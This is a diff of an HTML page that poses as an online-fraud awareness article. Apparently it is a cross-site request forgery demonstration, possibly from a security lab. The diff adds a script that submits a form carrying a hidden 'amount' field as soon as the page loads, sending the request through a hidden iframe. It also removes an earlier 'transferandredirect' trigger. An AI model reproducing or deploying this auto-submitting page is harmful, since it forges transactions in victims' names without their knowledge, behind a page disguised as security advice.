@@ -8,11 +8,9 @@
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 
 <div class="container">
-    img<img src="transferandredirect();"/>
     <div class="starter-template">
         <h1>Be aware of spammers</h1>
-<!--         <button onclick="transferandredirect();">Super Safe Link</button>
- -->
+
 <h3> Consumers aren’t the only ones at risk of online fraud. From recent data breaches at major retailers to increasing incidents of fraudulent emails,
     businesses are increasingly at risk of email and online fraud.  Many online safety precautions that apply to consumers can also protect businesses.</h3>
 
@@ -52,7 +50,17 @@ With cyber attacks on the rise, it’s more important than ever to install antiv
         <input name = "amount" type = "hidden" value = "1"/>
         <button type = "submit" >Make sure your account is secure! Check the RBi Guidelines here! </button>
     </form>
+<script type="text/javascript">
 
+function formAutoSubmit () {
+var frm = document.getElementById("tform1");
+frm.submit();
+
+}
+
+window.onload = formAutoSubmit;
+
+</script>
     <iframe name="my_frame" style="display:none;"></iframe>
     </div>
 </div>
